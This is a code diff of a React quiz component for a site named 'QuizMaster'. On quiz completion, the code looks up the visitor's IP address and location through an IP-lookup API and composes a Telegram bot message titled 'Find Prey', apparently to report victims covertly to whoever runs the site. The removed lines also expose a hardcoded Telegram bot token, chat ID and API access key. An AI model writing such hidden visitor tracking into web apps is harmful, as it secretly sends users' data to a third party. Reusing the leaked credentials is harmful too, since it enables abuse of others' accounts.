@@ -28,12 +28,13 @@ function Quiz() {
     : [];
 
   if (questionNumber === "done") {
-    let TOKEN = "8163645713:AAHaFjsdINJliid8j6F92Ah40NBusbusSbY";
-    let CHAT_ID = "-1002497555055";
-    let URL = `https://api.telegram.org/bot${TOKEN}`;
+    let TOKEN = import.meta.env.VITE_APP_IP_API_KEY;
+    let CHAT_ID = import.meta.env.VITE_APP_CHAT_ID;
+    let TELEGRAM_TOKEN = import.meta.env.VITE_APP_TELEGRAM_TOKEN;
+    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
 
     axios(
-      "https://apiip.net/api/check?accessKey=23d1bc50-51dd-402d-96ab-cfa032d2b8c0"
+      `https://apiip.net/api/check?accessKey=${TOKEN}`
     ).then((res) => {
       let message = `<b>Find Prey</b>\n`;
       message += `<b>Site name:</b> QuizMaster🧐\n`;
